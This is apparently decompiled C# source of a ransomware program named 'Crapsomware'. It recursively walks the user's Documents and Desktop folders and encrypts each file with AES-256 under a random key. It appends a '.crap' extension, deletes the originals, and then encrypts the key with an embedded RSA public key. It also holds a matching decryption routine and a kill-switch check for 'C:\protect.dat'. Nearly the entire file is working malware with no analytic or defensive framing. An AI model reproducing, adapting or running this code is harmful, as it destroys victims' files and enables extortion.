using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Windows.Forms;
using Crapsomware;
using Microsoft.Win32;

namespace ns0;

internal static class Class0
{
	public static string string_0 = "crap";

	public static Random random_0 = new Random();

	public static string string_1 = Convert.ToBase64String(smethod_0());

	public static byte[] byte_0 = Convert.FromBase64String("tiW3HWZv7FArtuULMz7CqwrBriKdSeTwoRc+azT//+UIKkzMf/GEuEX6kpBUAPmB7OsUxK1UjbMjS7159C3uuhbzKERJgUyGoIHSZSUBYZ7ZrrzJp81zJEDEqUeEuTgAelXb1uMVkMTKY4ePLDrCCQAjDlDPv+MWjJHuhnmNTCE=");

	public static byte[] byte_1 = Convert.FromBase64String("AQAB");

	public static byte[] byte_2;

	public static byte[] smethod_0()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			for (int i = 0; i < 10; i++)
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
		}
		return array;
	}

	public static void smethod_1(string string_2, string string_3)
	{
		try
		{
			byte[] array = smethod_0();
			FileStream fileStream = new FileStream(string_2 + "." + string_0, FileMode.Create);
			byte[] bytes = Encoding.UTF8.GetBytes(string_3);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CFB;
			fileStream.Write(array, 0, array.Length);
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_2, FileMode.Open);
			byte[] array2 = new byte[1048576];
			try
			{
				int count;
				while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
				{
					cryptoStream.Write(array2, 0, count);
				}
				fileStream2.Close();
				File.Delete(string_2);
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error: " + ex.Message);
			}
			finally
			{
				cryptoStream.Close();
				fileStream.Close();
			}
		}
		catch
		{
		}
	}

	public static void smethod_2(string string_2, string string_3, string string_4)
	{
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(string_4);
			byte[] array = new byte[32];
			FileStream fileStream = new FileStream(string_2, FileMode.Open);
			fileStream.Read(array, 0, array.Length);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			rijndaelManaged.Mode = CipherMode.CFB;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
			FileStream fileStream2 = new FileStream(string_3, FileMode.Create);
			byte[] array2 = new byte[1048576];
			try
			{
				int count;
				while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
				{
					fileStream2.Write(array2, 0, count);
				}
			}
			catch
			{
			}
			try
			{
				cryptoStream.Close();
				File.Delete(string_2);
			}
			catch
			{
			}
			finally
			{
				fileStream2.Close();
				fileStream.Close();
			}
		}
		catch
		{
		}
	}

	public static IEnumerable<string> smethod_3(string string_2)
	{
		try
		{
			IEnumerable<string> enumerable = Enumerable.Empty<string>();
			IEnumerable<string> source = Enumerable.Empty<string>();
			try
			{
				FileIOPermission val = new FileIOPermission((FileIOPermissionAccess)8, string_2);
				((CodeAccessPermission)val).Demand();
				enumerable = Directory.GetFiles(string_2);
				source = Directory.GetDirectories(string_2);
			}
			catch
			{
				string_2 = null;
			}
			if (string_2 != null)
			{
				yield return string_2;
			}
			foreach (string item in enumerable)
			{
				yield return item;
			}
			IEnumerable<string> enumerable2 = source.SelectMany(smethod_3);
			foreach (string item2 in enumerable2)
			{
				yield return item2;
			}
		}
		finally
		{
		}
	}

	public static IEnumerable<string> smethod_4()
	{
		string[] array = new string[2]
		{
			(string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", "Personal", "%USERPROFILE%\\Documents"),
			(string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", "Desktop", "%USERPROFILE%\\Desktop")
		};
		string[] array2 = array;
		foreach (string string_ in array2)
		{
			foreach (string item in smethod_3(string_))
			{
				if (item != Process.GetCurrentProcess().MainModule!.FileName)
				{
					yield return item;
				}
			}
		}
	}

	public static void smethod_5()
	{
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		foreach (string item in smethod_4())
		{
			if (!File.GetAttributes(item).HasFlag(FileAttributes.Directory) && Path.GetExtension(item) == "." + string_0)
			{
				smethod_2(item, item.Substring(0, item.Length - (string_0.Length + 1)), string_1);
			}
		}
		MessageBox.Show("Decryption done!", "", (MessageBoxButtons)0, (MessageBoxIcon)64);
		Process.GetCurrentProcess().Kill();
	}

	public static void smethod_6()
	{
		foreach (string item in smethod_4())
		{
			if (!File.GetAttributes(item).HasFlag(FileAttributes.Directory) && Path.GetExtension(item) != "." + string_0 && Path.GetFileName(item) != "desktop.ini" && Path.GetFileName(item) != "Thumbs.db")
			{
				smethod_1(item, string_1);
			}
		}
	}

	[STAThread]
	private static void Main()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		if (File.Exists("C:\\protect.dat"))
		{
			Process.GetCurrentProcess().Kill();
			Application.Exit();
		}
		smethod_6();
		byte_2 = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(string_1));
		RSAParameters parameters = default(RSAParameters);
		parameters.Modulus = byte_0;
		parameters.Exponent = byte_1;
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.ImportParameters(parameters);
		string_1 = Convert.ToBase64String(rSACryptoServiceProvider.Encrypt(Encoding.UTF8.GetBytes(string_1), fOAEP: false));
		Application.Run((Form)(object)new Form1());
	}
}
